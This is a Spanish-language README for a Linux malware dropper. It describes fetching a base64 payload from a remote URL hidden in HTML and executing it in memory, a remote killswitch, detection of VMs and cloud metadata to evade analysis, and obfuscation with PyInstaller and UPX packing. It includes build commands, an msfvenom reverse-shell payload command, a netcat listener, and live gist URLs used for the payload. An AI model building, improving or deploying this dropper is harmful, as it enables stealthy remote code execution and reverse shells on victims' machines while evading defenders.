# dropper

Dropper para Linux escrito en Python 3. Descarga y ejecuta un payload de forma dinámica, con killswitch remoto y detección de entorno virtualizado.

## Características

- **Killswitch remoto** — el dropper consulta una URL antes de ejecutarse. Si el contenido es `QUIETO PARAO` o la URL falla, termina sin hacer nada.
- **Detección de VM / cloud** — detecta entornos virtualizados mediante tres técnicas independientes antes de ejecutar el payload.
- **Payload dinámico** — descarga el payload en tiempo real desde una URL externa, lo extrae de entre delimitadores y lo ejecuta en memoria sin escribirlo a disco.
- **Builder** — script que inyecta la configuración, ofusca el código y genera un binario ELF nativo con PyInstaller.

## Estructura

```bash
├── dropper.py # Punto de entrada y flujo principal
├── killswitch.py # Comprobación del killswitch remoto
├── vm_detect.py # Detección de VM / cloud / QEMU
├── payload.py # Descarga, extracción y ejecución del payload
├── builder # Script de compilación y ofuscación
└── dist/
└── dropper_bin # Binario generado (ejemplo)
```

## Uso

### Compilar

```bash
chmod +x builder
./builder "<killswitch_url>" "<payload_url>"
```

El binario se genera en `dist/dropper_bin`.

### Ejecutar

```bash
./dist/dropper_bin
```

## Builder

El script `builder` realiza los siguientes pasos:

1. Copia los fuentes a un directorio temporal
2. Inyecta las URLs en `dropper.py` sustituyendo los placeholders `KILLSWITCH_URL_PLACEHOLDER` y `PAYLOAD_URL_PLACEHOLDER`
3. Ofusca cada módulo envolviéndolo en un wrapper `base64` + `exec(compile(...))`
4. Compila con PyInstaller `--onefile`
5. Comprime con UPX si está disponible
6. Limpia ficheros temporales

## Killswitch

El módulo `killswitch.py` realiza una petición HTTP GET a la URL configurada.

| Estado de la URL | Contiene `QUIETO PARAO` | Resultado |
|---|---|---|
| Accesible | ✅ Sí | Dropper detiene la ejecución |
| Accesible | ❌ No | Dropper continúa |
| Error / no existe | — | Dropper detiene la ejecución (fail-safe) |

## Detección de VM

El módulo `vm_detect.py` implementa tres técnicas sin dependencias nativas externas:

### 1. Proveedor cloud
Intenta conectar a `http://169.254.169.254` (metadata endpoint estándar de AWS, Azure, GCP). Si responde, se asume ejecución en cloud.

### 2. Análisis de CPU
Lee `/proc/cpuinfo` y verifica que `vendor_id` y `model name` correspondan a Intel o AMD. Cualquier otro fabricante detiene la ejecución.

### 3. Proceso qemu-guest-agent
Recorre `/proc` buscando procesos con nombre `qemu-guest-agent`. Si se detecta, detiene la ejecución.

## Payload

El módulo `payload.py` espera que la URL remota contenga el payload codificado en base64, delimitado por:

```bash
HELLO!:<base64>:!BYE
```

Todo el contenido fuera de esos delimitadores se ignora. Ejemplo válido embebido en HTML:

```html
<html>
<body>
<!-- HELLO!:BASE64_PAYLOAD_AQUI:!BYE -->
</body>
</html>
```

El flujo de ejecución es:

1. Descarga el contenido remoto
2. Extrae la cadena entre los delimitadores con regex
3. Decodifica desde base64
4. Ejecuta en memoria usando `mmap` + `ctypes` (sin escribir a disco)

## Dependencias

| Librería | Uso | Motivo |
|---|---|---|
| `requests` | Killswitch y descarga del payload | Manejo robusto de HTTP con timeouts y gestión de errores más limpia que `urllib` |
| `pyinstaller` | Compilación a binario nativo | Empaqueta el intérprete y dependencias en un único ELF |
| `certifi` | Verificación SSL | Incluido explícitamente para que PyInstaller lo empaquete correctamente |

El builder instala `requests` y `pyinstaller` automáticamente si no están presentes.

## Entorno de pruebas

Se recomienda usar Docker para no exponer el host:

```bash
docker run -it -v $(pwd):/data ubuntu:24.04
cd /data
apt-get update -qq && apt-get install -y python3 python3-pip netcat-openbsd
./builder "<killswitch_url>" "<payload_url>"
./dist/dropper_bin
```

Para probar la reverse shell dentro del mismo contenedor:

```bash
# Terminal 1 — listener
nc -lvnp 4444

# Terminal 2 — ejecutar dropper
./dist/dropper_bin
```

Generar un payload de prueba:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw | base64 -w0
```

## URLs de configuración empleados para las pruebas

| Recurso | URL |
|---|---|
| Killswitch | `https://gist.githubusercontent.com/dmartinm3/5fce63f6587f3bcfc78045b38d593978/raw/2fe9be28b9ff8746876edad27216ab1d3c2e0b7e/killswitch.txt` |
| Payload | `https://gist.githubusercontent.com/dmartinm3/5789b0b832504fb9f1bd1f9f782ab5cc/raw/a41088bffc1509b3945e8396ed5e7096ece58227/payload.html` |

## Notas

- El binario generado es un ELF x86-64 para Linux.
- La ofuscación base64 + PyInstaller dificulta el análisis estático del código fuente y las cadenas internas.
- En entornos con hardware ARM, la detección de CPU puede devolver un falso positivo al no encontrar `Intel` ni `AMD` en `/proc/cpuinfo`. Comportamiento intencionado como medida de seguridad adicional.